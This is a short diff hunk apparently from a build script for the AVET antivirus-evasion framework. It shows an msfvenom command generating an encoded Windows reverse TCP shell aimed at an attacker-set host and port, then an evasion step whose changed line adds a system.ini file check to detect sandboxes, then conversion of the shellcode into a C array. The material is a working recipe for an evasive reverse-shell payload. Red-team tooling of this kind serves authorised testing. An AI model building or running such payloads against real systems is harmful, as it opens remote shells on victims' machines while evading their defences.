@@ -27,7 +27,7 @@ msfvenom -p windows/shell/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shikata_g
 encode_payload avet input/sc_c.txt input/scenc_raw.txt
 
 # add fopen sandbox evasion technique
-add_evasion fopen_sandbox_evasion
+add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
 
 # format into c array for static include
 ./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf
